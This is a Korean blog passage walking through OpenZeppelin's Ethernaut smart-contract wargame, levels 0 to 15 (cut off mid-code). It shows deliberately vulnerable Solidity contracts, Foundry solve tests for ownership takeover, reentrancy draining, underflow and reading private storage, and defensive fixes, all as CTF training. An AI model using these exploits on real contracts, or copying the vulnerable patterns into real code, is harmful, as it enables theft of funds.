---
title: "Ethernaut Level 0–40"
date: 2026-10-02 10:00:00 +0900
categories: ["CTF & Wargame"]
tags: [ethernaut, solidity, ethereum, evm, smart-contract-security, wargame]
mermaid: true
---

## 1. 시작하며

**Ethernaut**은 OpenZeppelin의 Web3 워게임이며 Solidity와 EVM 보안 개념을 익힐수있다. 2026년 10월 2일 공식 저장소의 목록은 **Level 0부터 40까지 총 41개**다.

![Ethernaut 공식 페이지](/assets/img/ethernaut-all-clear/01-ethernaut-home.png)
_Ethernaut 공식 페이지_

브라우저 콘솔만으로 한 번씩 호출하는 데 그치지 않고 공식 저장소를 받아 Foundry 테스트로 공격 전·후 상태와 `validateInstance()` 결과를 확인했다. 기준 커밋은 `d05643a40aa98c45d66247c69ffceab8f44dd8cb`, 실행 환경은 Forge 1.8.4와 Prague EVM이다.

```text
공식 소스 분석 → 공격 가설 수립 → Foundry 로컬 재현
→ validateInstance() 확인 → 취약점 원인과 대응책 정리
```

공식 테스트 42개 스위트의 98개 테스트가 모두 통과했다. 공식 테스트가 아직 없는 Level 38·39는 별도 테스트를 작성해 각각 EIP-7702 재진입과 EIP-2098 서명 재사용을 재현했다. 또한 Level 40은 독립 PoC 테스트로 함수 선택자 충돌과 마지막 배열 원소가 해시에서 빠지는 결함을 확인했다.

## 2. 먼저 익힌 Solidity와 EVM 문법

Ethernaut 풀이에 반복해서 쓰인 요소는 다음과 같다.

| 문법·개념 | 보안상 의미 |
|---|---|
| `msg.sender`, `tx.origin` | 직접 호출자와 거래 최초 발신자는 다르다 |
| `call`, `delegatecall` | 외부 코드 실행, 재진입, 호출 문맥과 저장소 공유 |
| `fallback`, `receive` | 함수 선택자가 없거나 ETH를 받을 때 실행되는 진입점 |
| storage slot | `private`도 숨겨지지 않으며 프록시에서는 충돌 위험이 있다 |
| `abi.encode*`, selector | calldata 레이아웃과 앞 4바이트 함수 식별자 |
| `CREATE`, `CREATE2` | 배포 주소가 발신자·nonce 또는 salt로 결정된다 |
| ERC-20/721 콜백 | 토큰 이동도 외부 코드 실행을 유발할 수 있다 |
| ECDSA | 메시지 도메인, nonce, 정규화가 빠지면 서명 재사용이 가능하다 |
| EIP-7702 | EOA도 위임 코드를 실행할 수 있어 EOA/컨트랙트 이분법이 깨진다 |

`private`은 접근 제어가 아니라 Solidity 코드 수준의 가시성일 뿐이고, 블록 값은 비밀 난수가 아니며, 외부 호출 한 번은 제어권을 상대에게 넘기는 행위라는 세 문장이 전체 미션을 풀수있었다.

## 3. Level 0–7: 호출 문맥과 기본 함정

### Level 0 — Hello Ethernaut

#### 문제 설명과 목표

비밀번호를 찾아 authenticate를 호출한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Instance.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Instance {
    string public password;
    uint8 public infoNum = 42;
    string public theMethodName = "The method name is method7123949.";
    bool private cleared = false;

    // constructor
    constructor(string memory _password) {
        password = _password;
    }

    function info() public pure returns (string memory) {
        return "You will find what you need in info1().";
    }

    function info1() public pure returns (string memory) {
        return 'Try info2(), but with "hello" as a parameter.';
    }

    function info2(string memory param) public pure returns (string memory) {
        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked("hello"))) {
            return "The property infoNum holds the number of the next info method to call.";
        }
        return "Wrong parameter.";
    }

    function info42() public pure returns (string memory) {
        return "theMethodName is the name of the next method.";
    }

    function method7123949() public pure returns (string memory) {
        return "If you know the password, submit it to authenticate().";
    }

    function authenticate(string memory passkey) public {
        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
            cleared = true;
        }
    }

    function getCleared() public view returns (bool) {
        return cleared;
    }
}
```

</details>

#### 코드 분석

브라우저 개발자 콘솔에서 `contract.info()`, `info1()`, `info2("hello")`처럼 반환값을 따라가 최종 `password()`를 얻고 `authenticate(password)`를 호출한다. ABI를 통해 컨트랙트의 `view` 함수와 트랜잭션 함수를 구분하는 튜토리얼이다.

#### 풀이 과정

1. ABI에 공개된 view 함수를 순서대로 호출하고 password 값을 읽은 뒤 authenticate에 전달한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        string memory pw = instance.password();
        instance.authenticate(pw);
        assertTrue(instance.getCleared());

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 0 Hello Ethernaut 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-00-hello-ethernaut.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

온체인 값은 공개 정보다. 비밀 원문으로 권한을 보호하지 않는다.

### Level 1 — Fallback

#### 문제 설명과 목표

소유권을 탈취하고 잔액을 출금한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Fallback.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

</details>

#### 코드 분석

`contribute()`에 0.001 ETH보다 작은 값을 보내 기여 기록을 만든 뒤, 빈 calldata와 ETH를 보내 `receive()`를 실행한다. 조건을 만족하면 `owner = msg.sender`가 되고 `withdraw()`가 열린다.

```solidity
target.contribute{value: 1 wei}();
(bool ok,) = address(target).call{value: 1 wei}("");
require(ok);
target.withdraw();
```

권한 변경을 입금용 fallback에 섞지 말고, 소유권 변경에는 명시적인 접근 제어를 사용해야 한다.

#### 풀이 과정

1. contribute에 1 wei를 보내 contributions를 만든다.
2. 빈 calldata와 ETH로 receive를 실행해 owner가 된 뒤 withdraw한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        instance.contribute{value: 0.0001 ether}();

        (bool sent,) = address(instance).call{value: 1}("");
        require(sent, "Failed to send Ether to the instance");

        instance.withdraw();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 1 Fallback 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-01-fallback.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

입금용 receive에서 권한을 변경하지 않고 Ownable 같은 검증된 접근 제어를 쓴다.

### Level 2 — Fallout

#### 문제 설명과 목표

잘못 선언된 생성자를 호출해 owner가 된다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Fallout.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

</details>

#### 코드 분석

생성자여야 했던 함수 이름이 `Fal1out()`으로 오타가 나 일반 공개 함수가 되었다. 이를 호출하면 바로 소유자가 된다. 최신 Solidity의 `constructor` 키워드가 왜 필요한지 보여 준다.

#### 풀이 과정

1. 일반 public 함수가 된 Fal1out을 호출하고 owner 변경을 확인한 뒤 collectAllocations를 실행한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        instance.Fal1out();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 2 Fallout 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-02-fallout.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

이름 기반 생성자 대신 constructor 키워드를 사용한다.

### Level 3 — Coin Flip

#### 문제 설명과 목표

예측값을 열 번 연속 맞힌다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>CoinFlip.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

</details>

#### 코드 분석

컨트랙트가 `blockhash(block.number - 1)`을 상수로 나눈 값을 동전 결과로 쓴다. 같은 트랜잭션 안의 공격 컨트랙트도 똑같은 블록 값을 보므로 결과를 미리 계산해 10번 연속 맞힌다. 온체인 값만으로 만든 난수는 검증자와 공격자에게 모두 보인다.

#### 풀이 과정

1. 공격 컨트랙트에서 직전 blockhash와 같은 FACTOR로 side를 계산하고 블록마다 flip을 호출한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);
        CoinFlipAttack attacker = new CoinFlipAttack();

        // To weaponize this attack you'd need to pole for a new block to be mined, as the contract only allows one flip per block.
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            attacker.attack(address(instance));
        }

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 3 Coin Flip 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-03-coin-flip.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

블록 값만으로 난수를 만들지 말고 VRF 또는 commit-reveal을 사용한다.

### Level 4 — Telephone

#### 문제 설명과 목표

Telephone의 owner를 플레이어로 바꾼다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Telephone.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

</details>

#### 코드 분석

`tx.origin != msg.sender` 조건은 중간 공격 컨트랙트를 한 번 거치면 만족한다. 인증에 `tx.origin`을 쓰지 말고 역할 기반 접근 제어와 `msg.sender`를 사용해야 한다.

#### 풀이 과정

1. 중간 컨트랙트가 changeOwner를 호출하게 해 tx.origin과 msg.sender를 다르게 만든다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        TelephoneAttack attacker = new TelephoneAttack();
        attacker.attack(address(instance), player);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 4 Telephone 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-04-telephone.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

인증에 tx.origin을 사용하지 않는다.

### Level 5 — Token

#### 문제 설명과 목표

초기 20개보다 많은 토큰을 보유한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Token.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

</details>

#### 코드 분석

구버전 Solidity에서 잔고 20인 계정이 21을 전송하면 `20 - 21`이 언더플로되어 매우 큰 정수가 된다. Solidity 0.8+의 checked arithmetic이나 SafeMath가 방어책이다.

#### 풀이 과정

1. 21개를 보내 구버전 uint 언더플로를 일으키고 wrap된 거대한 잔고를 얻는다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        instance.transfer(address(instance), 21);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 5 Token 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-05-token.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

Solidity 0.8+ checked arithmetic을 사용한다.

### Level 6 — Delegation

#### 문제 설명과 목표

delegatecall을 통해 owner를 변경한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Delegation.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

</details>

#### 코드 분석

프록시의 fallback에 `pwn()` 선택자 `abi.encodeWithSignature("pwn()")`를 보낸다. `delegatecall`은 Delegate의 코드를 실행하지만 저장소와 `msg.sender`는 Delegation의 문맥을 유지하므로 슬롯 0의 owner가 바뀐다.

#### 풀이 과정

1. pwn() selector를 Delegation fallback으로 보내 Delegate 코드를 Delegation 저장소 문맥에서 실행한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 6 Delegation 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-06-delegation.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

프록시 호출 대상과 storage layout을 엄격히 통제한다.

### Level 7 — Force

#### 문제 설명과 목표

함수 없는 컨트랙트에 ETH를 강제로 보낸다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Force.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

</details>

#### 코드 분석

대상에는 payable 함수가 없지만, ETH를 가진 보조 컨트랙트가 `selfdestruct(payable(target))`를 실행하면 대상의 동의 없이 잔고가 생긴다. 컨트랙트 잔고가 내부 회계와 항상 같다고 가정하면 안 된다.

#### 풀이 과정

1. ETH를 넣은 보조 컨트랙트를 배포하고 selfdestruct 수신자를 target으로 지정한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        ForceAttack attacker = new ForceAttack{value: 1}();
        attacker.attack(payable(address(instance)));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 7 Force 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-07-force.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

address(this).balance를 내부 회계의 유일한 진실로 간주하지 않는다.

## 4. Level 8–13: 저장소, DoS, 재진입

### Level 8 — Vault

#### 문제 설명과 목표

private password를 얻어 잠금을 해제한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Vault.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

</details>

#### 코드 분석

`password`가 `private`이어도 storage slot 1을 `eth_getStorageAt` 또는 `vm.load`로 읽을 수 있다. 블록체인의 상태는 공개되어 있으므로 비밀값 원문을 온체인에 저장하지 않는다.

#### 풀이 과정

1. storage slot 1을 읽고 bytes32 값을 unlock에 전달한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        instance.unlock(password);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 8 Vault 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-08-vault.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

비밀 원문을 온체인에 저장하지 않는다.

### Level 9 — King

#### 문제 설명과 목표

새 왕이 영구히 되지 못하도록 게임을 막는다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>King.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

</details>

#### 코드 분석

현재 king보다 많은 ETH를 보내 왕이 된 뒤, ETH 수신 시 항상 revert하는 공격 컨트랙트를 왕으로 만든다. 다음 참가자에게 환불하는 `transfer`가 실패하면서 왕 교체 전체가 막힌다. push payment 대신 사용자가 직접 찾아가는 pull payment가 안전하다.

#### 풀이 과정

1. revert하는 receive를 가진 컨트랙트로 prize보다 많이 보내 왕이 된다.
2. 다음 환불이 실패해 왕 교체가 막힌다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        KingAttack attacker = new KingAttack();
        attacker.doYourThing{value: 2.01 ether}(address(instance));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 9 King 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-09-king.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

push payment 대신 pull payment를 사용한다.

### Level 10 — Re-entrancy

#### 문제 설명과 목표

대상 ETH를 모두 인출한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Reentrance.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

</details>

#### 코드 분석

`withdraw()`가 잔고를 줄이기 전에 `msg.sender.call{value: ...}`로 외부 호출한다. 공격 컨트랙트의 `receive()`에서 다시 `withdraw()`를 호출해 잔고가 갱신되기 전 반복 출금했다.


대응은 상태를 먼저 갱신하는 CEI 패턴과 `ReentrancyGuard`다. 단, 가드만 붙이는 것보다 불변식이 외부 호출 전 성립하도록 설계하는 편이 중요하다.

#### 풀이 과정

1. 먼저 donate하고 withdraw를 호출한다.
2. receive 콜백에서 잔고 차감 전 withdraw를 반복한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        ReentranceAttack attacker = new ReentranceAttack{value: player.balance}(payable(address(instance)));
        attacker.attack_1_causeOverflow();
        attacker.attack_2_deplete();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 10 Re-entrancy 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-10-re-entrancy.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

CEI와 ReentrancyGuard를 적용한다.

### Level 11 — Elevator

#### 문제 설명과 목표

top을 true로 만든다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Elevator.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

</details>

#### 코드 분석

대상은 호출자가 구현한 `isLastFloor()`를 두 번 호출하고 결과가 항상 같다고 가정한다. 공격 구현은 첫 호출에 false, 두 번째 호출에 true를 반환한다. 외부 `view` 인터페이스라도 상대 상태에 따라 다른 값을 낼 수 있다.

#### 풀이 과정

1. isLastFloor의 첫 호출은 false, 두 번째 호출은 true가 되도록 상태ful Building을 구현한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        ElevatorAttack attack = new ElevatorAttack();
        attack.attack(address(instance));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 11 Elevator 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-11-elevator.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

외부 조회 함수의 일관성을 신뢰하지 않는다.

### Level 12 — Privacy

#### 문제 설명과 목표

storage에서 key를 복원해 unlock한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Privacy.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

</details>

#### 코드 분석

storage packing을 계산하면 `locked`가 slot 0, 정수들이 slot 1, `data[0..2]`가 slot 3~5에 놓인다. slot 5의 앞 16바이트를 `bytes16`으로 잘라 `unlock()`에 전달한다.

#### 풀이 과정

1. packing을 계산해 slot 5를 읽고 앞 16바이트를 bytes16으로 잘라 전달한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        bytes32 data = vm.load(address(instance), bytes32(uint256(5)));
        instance.unlock(bytes16(data));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 12 Privacy 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-12-privacy.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

private은 비밀 보장이 아니다.

### Level 13 — Gatekeeper One

#### 문제 설명과 목표

세 gate를 통과해 entrant가 된다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>GatekeeperOne.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

</details>

#### 코드 분석

세 관문을 맞춘다. 공격 컨트랙트를 경유해 `msg.sender != tx.origin`, `tx.origin` 하위 16비트에 맞는 `bytes8` 키, 그리고 `gasleft() % 8191 == 0`이 되도록 가스를 탐색한다. 가스 잔량은 인증 수단이 아니다.

#### 풀이 과정

1. 컨트랙트를 경유하고 origin 하위 비트로 key를 만든 뒤 gas를 반복 탐색해 8191 배수 조건을 맞춘다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.prank(player, player);
        GatekeeperOneAttack attacker = new GatekeeperOneAttack(address(instance));

        vm.prank(player);
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 13 Gatekeeper One 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-13-gatekeeper-one.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

gasleft나 origin을 인증 수단으로 쓰지 않는다.

## 5. Level 14–21: 생성 시점, allowance, 주소와 바이트코드

### Level 14 — Gatekeeper Two

#### 문제 설명과 목표

생성자에서 세 gate를 통과한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>GatekeeperTwo.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

</details>

#### 코드 분석

공격 컨트랙트 생성자 안에서 호출하면 런타임 코드가 아직 배치되지 않아 `extcodesize(caller()) == 0`이다. 키는 `keccak256(msg.sender)`와 XOR했을 때 `uint64.max`가 되도록 반전한다. 코드 크기로 EOA 여부를 판별하는 방법은 생성자와 EIP-7702 앞에서 깨진다.

#### 풀이 과정

1. constructor 실행 중 extcodesize가 0인 점을 이용하고 keccak256(caller)을 XOR 역산한 key로 enter한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.prank(player, player);
        GatekeeperTwoAttack attacker = new GatekeeperTwoAttack(address(instance));

        vm.startPrank(player);
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 14 Gatekeeper Two 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-14-gatekeeper-two.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

code size로 EOA를 판별하지 않는다.

### Level 15 — Naught Coin

#### 문제 설명과 목표

시간 잠금을 우회해 전 잔고를 옮긴다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>NaughtCoin.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
